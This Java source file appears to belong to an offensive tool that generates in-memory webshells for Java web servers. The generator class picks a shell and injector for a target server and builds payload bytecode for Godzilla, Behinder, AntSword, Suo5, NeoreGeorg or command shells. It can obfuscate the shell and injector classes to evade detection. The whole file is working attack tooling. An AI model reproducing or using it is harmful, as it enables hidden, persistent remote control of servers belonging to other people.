package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.memshell.generator.*;
import com.reajason.javaweb.memshell.server.AbstractShell;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import me.n1ar4.clazz.obfuscator.api.ClassObf;
import me.n1ar4.clazz.obfuscator.config.BaseConfig;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.tuple.Pair;

import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class MemShellGenerator {

    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        Server server = shellConfig.getServer();
        AbstractShell shell = server.getShell();
        if (shell == null) {
            throw new IllegalArgumentException("Unsupported server: " + server);
        }

        if (StringUtils.isBlank(shellToolConfig.getShellClassName())) {
            shellToolConfig.setShellClassName(CommonUtil.generateShellClassName(server, shellConfig.getShellType()));
        }

        if (StringUtils.isBlank(injectorConfig.getInjectorClassName())) {
            injectorConfig.setInjectorClassName(CommonUtil.generateInjectorClassName());
        }

        Class<?> injectorClass = null;

        if (ShellTool.Custom.equals(shellConfig.getShellTool())) {
            injectorClass = shellConfig.getServer().getShell().getShellInjectorMapping().getInjector(shellConfig.getShellType());
        } else {
            Pair<Class<?>, Class<?>> shellInjectorPair = shellConfig.getServer().getShell().getShellInjectorPair(shellConfig.getShellTool(), shellConfig.getShellType());
            if (shellInjectorPair == null) {
                throw new UnsupportedOperationException(server + " unsupported shell type: " + shellConfig.getShellType() + " for tool: " + shellConfig.getShellTool());
            }
            Class<?> shellClass = shellInjectorPair.getLeft();
            injectorClass = shellInjectorPair.getRight();
            shellToolConfig.setShellClass(shellClass);
        }

        byte[] shellBytes = generateShellBytes(shellConfig, shellToolConfig);

        if (shellConfig.isObfuscate()) {
            BaseConfig config = BaseConfig.Default();
            config.setIgnorePublic(true);
            config.setEnableMethodName(false);
            config.setEnableFieldName(false);
            config.setEnableAES(false);
            config.setEnableAdvanceString(false);
            config.setQuiet(true);

            ClassObf classObf = new ClassObf(config);
            shellBytes = classObf.run(shellBytes).getData();
        }

        injectorConfig.setInjectorClass(injectorClass);
        injectorConfig.setShellClassName(shellToolConfig.getShellClassName());
        injectorConfig.setShellClassBytes(shellBytes);

        InjectorGenerator injectorGenerator = new InjectorGenerator(shellConfig, injectorConfig);
        byte[] injectorBytes = injectorGenerator.generate();

        if (shellConfig.isObfuscate()) {
            BaseConfig config = BaseConfig.Default();
            config.setIgnorePublic(true);
            config.setEnableMethodName(false);
            config.setEnableFieldName(false);
            config.setEnableAES(false);
            config.setEnableAdvanceString(false);
            config.setQuiet(true);

            ClassObf classObf = new ClassObf(config);
            injectorBytes = classObf.run(injectorBytes).getData();
        }

        Map<String, byte[]> innerClassBytes = injectorGenerator.getInnerClassBytes();

        return GenerateResult.builder()
                .shellConfig(shellConfig)
                .shellToolConfig(shellToolConfig)
                .injectorConfig(injectorConfig)
                .shellClassName(shellToolConfig.getShellClassName())
                .shellBytes(shellBytes)
                .injectorClassName(injectorConfig.getInjectorClassName())
                .injectorBytes(injectorBytes)
                .injectorInnerClassBytes(innerClassBytes)
                .build();
    }

    private static byte[] generateShellBytes(ShellConfig shellConfig, ShellToolConfig shellToolConfig) {
        switch (shellConfig.getShellTool()) {
            case Godzilla:
                return new GodzillaGenerator(shellConfig, (GodzillaConfig) shellToolConfig).getBytes();
            case Command:
                return new CommandGenerator(shellConfig, (CommandConfig) shellToolConfig).getBytes();
            case Behinder:
                return new BehinderGenerator(shellConfig, (BehinderConfig) shellToolConfig).getBytes();
            case Suo5:
                return new Suo5Generator(shellConfig, ((Suo5Config) shellToolConfig)).getBytes();
            case AntSword:
                return new AntSwordGenerator(shellConfig, (AntSwordConfig) shellToolConfig).getBytes();
            case NeoreGeorg:
                return new NeoreGeorgGenerator(shellConfig, (NeoreGeorgConfig) shellToolConfig).getBytes();
            case Custom:
                return new CustomShellGenerator(shellConfig, (CustomConfig) shellToolConfig).getBytes();
            default:
                throw new UnsupportedOperationException("Unknown shell tool: " + shellConfig.getShellTool());
        }
    }
}